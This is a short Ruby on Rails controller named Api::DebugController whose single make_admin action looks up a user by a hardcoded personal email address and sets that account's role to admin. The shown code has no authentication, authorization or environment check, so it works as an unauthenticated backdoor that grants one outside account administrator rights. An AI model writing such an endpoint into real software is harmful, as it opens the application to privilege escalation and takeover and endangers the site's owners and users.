class Api::DebugController < ActionController::API
  def make_admin
    user = User.find_by(email: "cafalova@gmail.com")

    if user
      user.update!(role: "admin")

      render json: {
        success: true,
        role: user.role
      }
    else
      render json: {
        success: false,
        error: "User not found"
      }
    end
  end
end